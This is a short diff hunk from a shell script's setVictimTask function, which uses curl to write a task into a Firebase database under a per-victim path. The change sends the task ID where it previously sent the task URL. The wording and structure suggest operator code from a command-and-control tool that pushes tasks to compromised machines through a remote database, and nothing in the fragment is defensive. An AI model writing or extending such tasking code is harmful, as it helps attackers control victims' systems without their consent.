@@ -82,7 +82,7 @@ function setVictimTask() {
   if [ -z "$taskURL" ]; then
     echo "Error: Specified task '$taskID' does not exist"
   else
-    curl -X PUT -d "\"$taskURL\"" "https://${firebaseProject}.firebaseio.com/victims/$victim/task.json" &>/dev/null
+    curl -X PUT -d "\"$taskID\"" "https://${firebaseProject}.firebaseio.com/victims/$victim/task.json" &>/dev/null
   fi
 }
 
